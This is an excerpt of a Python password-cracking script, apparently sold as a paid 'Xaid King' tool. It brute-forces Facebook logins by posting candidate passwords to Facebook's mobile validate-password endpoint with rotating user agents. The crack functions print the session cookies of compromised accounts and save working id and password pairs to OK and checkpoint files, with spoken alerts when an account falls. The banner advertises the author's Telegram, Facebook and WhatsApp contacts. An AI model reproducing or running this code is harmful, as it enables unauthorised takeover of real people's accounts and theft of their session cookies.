...
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY TELIGERM GROUP")
time.sleep(2)
os.system(f'xdg-open https://t.me/xaidapk')
#------------------[ xaid-king ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/xaidul.king')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ MOBILE DATA + WIFI 100% ]          \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠[•]═[X]═[Author             • \33[1;38m[MR-Xaid ]    \33[1;38m ║\033[1;31m 
╠[•]═[A]═[Facebook           • [X Said Ul  ]  ║  \033[1;97m  
╠[•]═[I]═[Github             • \33[1;38m[XAIDUL-1971]  ║\33[1;34m   
╠[•]═[D]═[Whatsapp           •[ 01731361979 ] ║\33[1;35m 
╠[•]═[U]═[TOOLS              • [Paid]         ║ \33[1;32m   
╠[•]═[L]═[VERSION            • [0.2 ]         ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
os.system('clear')
print(logo)
...
os.system('espeak -a 300 " Boss,  Welcome,   to,  Xaid,  King,  Tools"')
pass
...
def sumu():
    os.system('clear')
    print(logo)
    print(f"\033[97;1m[\033[92;1mS\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print("\033[97;1m[\033[92;1mS\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
    print('\033[0;97m===============================================')
    ...
    if Xaid in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801731361979')
        os.system("python nono.py")
    elif Xaid in ['3','03']:
        result()
    elif Xaid in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Xaid•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Xaid-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Xaid-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Boss,  We,  Get,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Xaid-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Xaid-Cp] {idf} • {pw}')
                os.system('espeak -a 300 "Boss,   Fuck,   Cp,  id,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Xaid-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Boss,  We,  Get,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
